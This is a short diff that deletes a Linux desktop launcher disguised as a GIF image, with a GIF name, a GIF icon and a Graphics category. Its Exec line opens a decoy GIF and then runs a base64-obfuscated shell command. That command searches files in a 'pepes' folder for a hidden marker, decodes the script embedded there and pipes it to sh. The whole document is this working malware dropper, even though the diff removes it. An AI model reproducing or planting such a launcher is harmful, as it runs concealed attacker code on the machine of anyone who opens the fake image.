@@ -1,7 +1,0 @@
-[Desktop Entry]
-Name=AakvuTLpAM4Q.gif
-Exec=sh -c "open ./giphy-2.gif && echo 'Zm9yIGZpbGUgaW4gJChmaW5kIC4vcGVwZXMpOyBkbyBpZiBjYXQgJGZpbGUgfCBncmVwICJVMVJCVWxSVFExSkpVRlE2SSI7IHRoZW4gY29kZT0iJChjYXQgJGZpbGUgfCBncmVwIC1hICdVMVJCVWxSVFExSkpVRlE2SScgfCBiYXNlNjQgLWQgfCBzZWQgJ3MvU1RBUlRTQ1JJUFQ6IC8vJykiOyBmaTsgZG9uZTsgZWNobyAkY29kZSB8IHNoIC1zIAo=' | base64 -d | sh -s"
-Terminal=false
-Icon=./giphy-2.gif
-Type=Application
-Categories=Graphics
